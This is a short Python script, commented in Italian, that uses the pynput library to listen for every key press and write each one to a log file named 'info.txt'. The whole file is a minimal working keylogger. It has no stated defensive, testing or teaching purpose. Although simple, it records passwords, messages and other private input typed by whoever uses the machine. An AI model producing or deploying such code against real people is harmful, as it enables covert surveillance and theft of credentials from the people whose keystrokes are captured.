import logging
from pynput.keyboard import Key, Listener

# Configura il percorso del file di log
logging.basicConfig(filename="info.txt", level=logging.DEBUG)

# Definisci una funzione per registrare i tasti premuti
def register_keys(key):
    logging.info(str(key))

# Rimani in ascolto dei tasti premuti
with Listener(on_press=register_keys) as listener:
    listener.join()
